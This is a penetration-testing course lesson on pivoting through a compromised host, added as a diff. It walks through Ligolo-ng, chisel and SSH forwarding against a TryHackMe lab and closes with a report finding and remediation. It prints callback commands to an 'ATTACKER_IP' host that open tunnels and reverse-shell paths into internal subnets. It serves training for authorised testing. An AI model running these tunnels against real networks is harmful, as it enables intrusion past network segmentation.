@@ -1,0 +1,163 @@
+# Network Module — Lesson 5: Pivoting
+
+**Methodology phase:** Post-exploitation → lateral movement. You've compromised one host; now you use it to reach machines you *can't* touch from your Kali box.
+**Why it matters for PT1:** the exam network is segmented. Reviewers named **Ligolo-ng** by name as the pivoting tool, and pivoting is what connects the Network foothold to the **Active Directory** section — the DC and its clients typically live on an internal subnet only the first compromised host can see.
+
+**The core idea:** your compromised host has a second network interface (or route) into a hidden subnet. Pivoting turns that host into a tunnel so your tools run *from your Kali box* but reach the internal network *through* the pivot.
+
+---
+
+## 1. Spot the need for a pivot
+
+On your foothold shell, check its networking:
+```bash
+ip a            # Linux — look for a second interface / subnet
+ipconfig        # Windows
+arp -a          # hosts this machine has talked to
+```
+If the box has an interface on, say, `172.16.5.0/24` that your VPN (`tun0`) can't reach, that subnet is your next target — and this host is the only way in. That's when you pivot.
+
+---
+
+## 2. Ligolo-ng — the modern pivot (reviewers' pick)
+
+Ligolo-ng creates a userland network interface on your attack box that routes traffic through the compromised host. No `proxychains` gymnastics — your tools "just work" against the internal subnet.
+
+> **Get the binaries first.** Ligolo-ng ships as two downloads from its GitHub releases: `proxy` (runs on your Kali box) and `agent` (runs on the compromised host). Download both, and `chmod +x proxy agent` — a fresh binary won't run ("Permission denied") until you do. Get the **agent onto the target** with the "serve on Kali, fetch on target" pattern (`python3 -m http.server` + `wget`, from `labs/02`). Use matching versions for proxy and agent, or the session won't connect.
+
+**On your Kali box (the proxy/server side):**
+```bash
+# one-time: make the tun interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+# start the listener (chmod +x proxy first)
+./proxy -selfcert
+```
+- `ip tuntap add ... ligolo` — creates a virtual interface named `ligolo` that Ligolo will route through.
+- `./proxy -selfcert` — starts the Ligolo server with a self-signed cert; it listens (default `:11601`) for the agent to call back.
+
+**On the compromised host (the agent side):**
+```bash
+# transfer the matching agent binary, then:
+./agent -connect ATTACKER_IP:11601 -ignore-cert
+```
+- The agent dials back to your proxy. In the Ligolo console you'll see the session connect; type `session` to select it.
+
+**Add the route so your box knows to send internal traffic through the tunnel:**
+```bash
+# on Kali, add the internal subnet route via the ligolo interface
+sudo ip route add 172.16.5.0/24 dev ligolo
+```
+- Now `nmap 172.16.5.10`, `nxc smb 172.16.5.0/24`, `evil-winrm -i 172.16.5.10` — every tool — reaches the internal subnet transparently, as if you were plugged into it.
+
+**Reverse port forward (bring an internal port to your box), for catching shells from the internal net:**
+```bash
+# in the ligolo session console:
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
+```
+- Makes the pivot host listen on `:4444` and forward to *your* `:4444`, so an internal machine's reverse shell reaches your listener through the tunnel.
+
+> **Why Ligolo over the old ways:** with a route added you use your tools *unmodified*. No wrapping every command in `proxychains`, no per-port forwarding. It's why reviewers reach for it on PT1.
+
+---
+
+## 3. Chisel — the classic alternative (know it too)
+
+If Ligolo isn't available, `chisel` does SOCKS-proxy pivoting. Worth knowing because it's everywhere in older writeups.
+
+**On Kali (server):**
+```bash
+./chisel server -p 8000 --reverse
+```
+- `-p 8000` listen port · `--reverse` allow reverse port forwards (client → server).
+
+**On the compromised host (client):**
+```bash
+./chisel client ATTACKER_IP:8000 R:socks
+```
+- `R:socks` — set up a **reverse SOCKS proxy**: traffic you send to your local SOCKS port tunnels out through the pivot into the internal net.
+
+**Use it via proxychains:**
+```bash
+# /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 172.16.5.10
+proxychains nxc smb 172.16.5.0/24
+```
+- `proxychains` forces the wrapped tool's traffic through the SOCKS proxy. Use `-sT` (TCP connect) with nmap over proxychains — SYN scans don't work through a SOCKS tunnel.
+
+---
+
+## 4. Simple SSH port forwarding (when you have SSH creds)
+
+No special tools needed if you have SSH access to the pivot.
+
+**Local forward** (bring one internal port to your box):
+```bash
+ssh -L 8080:172.16.5.10:80 user@PIVOT_IP
+```
+- `-L 8080:172.16.5.10:80` — your local `:8080` → the pivot → internal host `172.16.5.10:80`. Browse `localhost:8080` to hit the internal web app.
+
+**Dynamic forward** (a full SOCKS proxy over SSH):
+```bash
+ssh -D 1080 user@PIVOT_IP
+```
+- `-D 1080` — a SOCKS proxy on your `:1080`; point proxychains at it and reach the whole internal subnet. Simple and reliable when SSH is available.
+
+---
+
+## 5. Worked example — pivot from foothold to the DC
+
+Room: **[TryHackMe — Wreath](https://tryhackme.com/room/wreath)** (pivoting network) / *Holo*.
+
+1. **Compromise the first host** and get a stable shell (Lessons 2–4).
+2. **Discover the hidden subnet:** `ip a` shows a second NIC on `10.200.x.0/24` you can't reach from `tun0`.
+3. **Set up Ligolo:** start `./proxy -selfcert` on Kali, run `./agent -connect ATTACKER_IP:11601 -ignore-cert` on the pivot, select the session.
+4. **Route the subnet:** `sudo ip route add 10.200.x.0/24 dev ligolo`.
+5. **Scan through the tunnel:** `nmap -sV 10.200.x.10` reveals a Domain Controller (Kerberos 88, LDAP 389, SMB 445).
+6. **Attack it with your normal tools:** `nxc smb 10.200.x.10`, `evil-winrm`, impacket — all now reach the DC. You've arrived at the Active Directory section.
+
+> **Dead end kept in:** I added the Ligolo route but tools still couldn't reach the subnet — because the agent session wasn't *selected* in the Ligolo console (you must `session` → pick it → `start` the tunnel). Adding the route isn't enough; the tunnel has to be active. Lesson: confirm the session is started, then test with a single `ping`/`nmap` before running your whole toolkit.
+
+---
+
+## 6. Exercises
+
+**Exercise 1 — find the subnet.** On a foothold, identify a second network the host can reach but your VPN can't. Which interface/route revealed it?
+**Exercise 2 — Ligolo pivot.** Establish a Ligolo tunnel and add the route. Prove it by scanning an internal host from your Kali box with plain `nmap` (no proxychains).
+**Exercise 3 — chisel + proxychains.** Do the same pivot with chisel and a SOCKS proxy. What proxychains config and nmap flags did you need?
+**Exercise 4 — report it.** Write the lateral-movement finding: the pivot host, the hidden subnet, the tunnel method, and what it exposed (e.g. the DC).
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** `ip a`/`ipconfig` shows a second interface (e.g. `eth1: 172.16.5.5/24`); `arp -a` shows internal hosts it has contacted. That subnet is unreachable from `tun0`, so the foothold is the only route in.
+
+**Exercise 2.** Kali: `./proxy -selfcert`; pivot: `./agent -connect ATTACKER_IP:11601 -ignore-cert`; console: `session` → select → (tunnel starts); Kali: `sudo ip route add 172.16.5.0/24 dev ligolo`. Test: `nmap -sV 172.16.5.10` returns results with no proxychains — that's the proof.
+
+**Exercise 3.** Kali: `./chisel server -p 8000 --reverse`; pivot: `./chisel client ATTACKER_IP:8000 R:socks`; `/etc/proxychains4.conf` → `socks5 127.0.0.1 1080`; then `proxychains nmap -sT -Pn 172.16.5.10` (TCP-connect scan, since SYN doesn't traverse SOCKS).
+
+**Exercise 4 — model finding.**
+> **Title:** Network segmentation bypass via compromised dual-homed host (High).
+> **Category (predefined):** Security Misconfiguration / Lateral Movement.
+> **Affected:** pivot host 10.10.x.x (interfaces on `tun0`-reachable net and internal `172.16.5.0/24`).
+> **Initial reconnaissance:** `ip a` on the foothold revealed a second interface on `172.16.5.0/24`, unreachable from the testing host directly.
+> **Exploitation:** Established a Ligolo-ng tunnel through the pivot and routed `172.16.5.0/24` over it, gaining direct access to internal hosts including the Domain Controller `172.16.5.10` (SMB/LDAP/Kerberos exposed).
+> **Impact:** A single compromised perimeter host grants full network access to the internal/AD environment, defeating segmentation.
+> **Remediation:** Enforce strict east-west segmentation and host-based firewalls; restrict which hosts may route between zones; monitor for tunneling and anomalous internal connections from user hosts.
+
+</details>
+
+---
+
+## 7. Carry forward — Network module complete
+
+You now have the full Network chain:
+
+- **Lesson 1 Recon** → **2 Service exploitation & shells** → **3 Linux privesc** → **4 Windows privesc** → **5 Pivoting.**
+- The through-line: enumerate thoroughly, turn a service into a shell, escalate to root/SYSTEM via one misconfiguration, then pivot to the next network — and write the finding at each step.
+
+Pivoting is the hinge between sections: the tunnel you build here is how you reach the Domain Controller. That's exactly where the next module starts.
+
+**Next module:** `active-directory/` — enumerating AD, Kerberoasting and AS-REP roasting, BloodHound, impacket/NetExec, and chaining misconfigurations to Domain Admin. That's what we build after your review of this Network module.
